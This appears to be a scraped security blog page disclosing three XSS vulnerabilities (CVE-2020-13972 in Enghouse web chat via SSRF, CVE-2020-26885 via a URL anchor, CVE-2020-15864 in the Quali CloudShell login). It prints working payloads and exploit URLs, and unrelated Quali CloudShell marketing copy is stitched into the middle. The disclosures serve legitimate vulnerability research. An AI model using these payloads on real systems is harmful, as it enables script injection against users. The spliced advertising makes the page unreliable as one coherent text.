### [CVE-2020-13972 - XSS via SSRF in Enghouse/Zeacom web chat](https://burninatorsec.blogspot.com/2020/09/cve-2020-13972-xss-via-ssrf-in.html)

Here's a chained attack of a known SSRF issue ([CVE-2019-16948 / CVE-2019-16951](https://mjlanders.com/2019/11/07/multiple-vulnerabilities-found-in-enghouse-zeacom-web-chat/) ) in order to get XSS in Enghouse Web Chat 6.2.284.34.

When an attacker enters their own URL in the WebServiceLocation parameter, the response from the POST request is displayed by the application client side, and any JavaScript returned from the external server is executed in the browser.

For example, the attacker injects their URL (ending in /ooowee):

The endpoint at /ooowee is returning a XSS payload as a POST response (using mdonkers script from GitHub for a quick server to spin up):[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg3zBDKu-RmFjBuoczLKg9RGkaPWiznrrHCheWm0OIv4ZIRGjsjQEtp1Bf6IcY_erg1Ml5ciAJwxxzDwv0ql1RFgWT_GcXI2EtT7_ovmP2bCBB43weCvyhM1vdL3AhxZt5DD_S0flboe0/s640/image007.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg3zBDKu-RmFjBuoczLKg9RGkaPWiznrrHCheWm0OIv4ZIRGjsjQEtp1Bf6IcY_erg1Ml5ciAJwxxzDwv0ql1RFgWT_GcXI2EtT7_ovmP2bCBB43weCvyhM1vdL3AhxZt5DD_S0flboe0/s881/image007.png)

The XSS payload pops for the client:

## Is Manual Provisioning Slowing Your Teams Down?

Outdated infrastructure provisioning and environment orchestration processes can take days or weeks to complete, holding up critical workflows and extending project timelines.

  ![]()
### Manual Orchestration

Complex infrastructure and environments often need to be configured manually, creating bottlenecks and leading to burnout for your skilled infrastructure experts.

  ![]()
### Access Delays

Lengthy provisioning processes create delays for the end users who need access to environments to get their work done, extending timelines for critical projects.

  ![]()
### Configuration Chaos

Individually delivered environments are difficult to maintain, leading to out-of-date infrastructure, unnecessary costs, and security and compliance risks.

## Quali CloudShell boosts productivity with **easy-to-use infrastructure**

### Scalable Infrastructure

Eliminate redundant manual work with reusable definitions of your cloud, on-premises, and hybrid infrastructure assets.

### Self-Service Access

Cut out the bottlenecks with democratized access to launch complete environments on-demand via self service.

### Continuous Management

Monitor usage and maintain your reusable blueprints to keep all infrastructure your teams deploy up to date.

## See How Quali CloudShell Works

This brief demo shows how CloudShell makes infrastructure and environments scalable and easier to use.

## Frequently Asked Questions

  Does Quali support existing IaC scripts for environment blueprints?

Yes! While Quali’s CloudShell will help make reusable assets for your infrastructure, Quali’s Torque platform will also import and automatically configure blueprints for environments based on the infrastructure as code scripts, Helm Charts, and native Kubernetes manifests in your Git repositories.

You can learn more about Quali Torque here.

  Does CloudShell assist with inventory management?

Yes. Quali CloudShell comes with an out-of-the-box dashboard to provide insights into user, resource, and reservation statistics.

  What about support for hybrid environments?

CloudShell models and deploys hybrid infrastructure in a single environment, c/w inventory management, and advanced network configurations (L1-L3).

  Can CloudShell help with device utilization?

Yes. CloudShell provides advanced capabilities for device scheduling, reservations, sharing, and queuing by availability.

  What are Shells and what do they do?

A Shell provides CloudShell users a standard approach to interact with and automate different environment elements, like physical devices and virtual applications. Shells are open source and based on Python. In the CloudShell community, users can find certified, out-of-box Shells for common technologies. Users can also create new Shells independently based on existing standards using our Developer guide, and can share them for the rest of the CloudShell community to use.

  How does CloudShell support role-based access controls (RBAC)?

CloudShell supports configurable RBAC and IAM using Active Directory, LDAP, and Single Sign-on.

### CVE-2020-26885 XSS in Anchor Tags

For CVE-2020-26885, the AWS WAF made it difficult to get XSS payloads through to the server, but I was able to rely on the client to execute one by using the anchor tag in the URL to exploit it:

/test.html#variable1=true&app=3&version=">IMG%20SRC=%23%20onerror="alert('burninatorsec')">

### CVE-2020-15864 - XSS in Quali CloudShell Login

Payload:

**{{constructor.constructor(%27alert(19891337)%27)()}**

Add "username" as a parameter to the login URL to reference the username field of the Quali CloudShell login page, and the JavaScript will execute when they visit the URL, i.e.

**https://victim/Account/Login?ReturnUrl%252fAccount%252f%&username={{constructor.constructor(%27alert(1337)%27)()}}**

Note: <sCript>alert(1337)<scRipt> works too, but isn't as dangerous because it won't autoload through the URL like the constructor payload does.
